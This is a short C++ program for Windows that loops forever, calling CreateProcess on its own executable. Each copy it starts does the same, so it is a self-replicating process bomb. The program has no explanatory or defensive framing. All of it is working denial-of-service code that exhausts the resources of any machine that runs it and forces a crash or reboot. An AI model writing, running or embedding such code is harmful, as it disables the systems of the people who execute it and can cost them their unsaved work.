#include <processthreadsapi.h>

int main(int argc, char* argv[]) {
    if (argc < 1) {
        return -1;
    }

    STARTUPINFO info = {sizeof(info)};
    PROCESS_INFORMATION processInfo;
    for(;;)
        int ret = CreateProcess(argv[0], nullptr, nullptr, nullptr, false, 0, nullptr, nullptr, &info, &processInfo);
    return 0;
}